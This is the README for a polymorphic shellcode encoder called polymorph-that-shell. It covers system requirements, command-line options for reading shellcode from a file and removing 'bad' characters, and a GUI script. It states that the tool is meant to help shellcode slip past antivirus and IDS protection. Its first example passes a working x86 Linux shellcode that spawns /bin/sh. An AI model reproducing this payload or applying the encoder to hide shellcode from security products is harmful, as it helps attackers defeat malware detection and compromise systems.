polymorph-that-shell
====================


Polymorph-that-shell is a simple polymorphic engine to dynamically encode (Insertion-Encoder) shellcode. Therefore "everytime" the decoder stub is created in another way (polymorph). This may avoid antivirus and IDS protection.


System requirements: linux x86 environment, python 2.7, nasm, ld, objdump

IMPORTANT: At the moment the compiler process only makes executables for linux before dumping their hex-code. If you need a working shellcode for windows you need to customize the .sh file


Usage: ./polymorphThatShell.sh [OPTIONS] [SHELLCODE_IN_C_FORMAT|SHELLCODE_FILE]

-f: Read shellcode from file

-b: Generate shellcode without "bad" characters (e.g.: "\x00")

-fb: Read shellcode from file and generate polymorphed shellcode without "bad" characters

Example 1: ./polymorphThatShell.sh "\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x8d\x4c\x24\x08\xcd\x80"

Example 2: ./polymorphThatShell.sh -f shellFile


You also can use a simple GUI by calling the ./gui.pyw script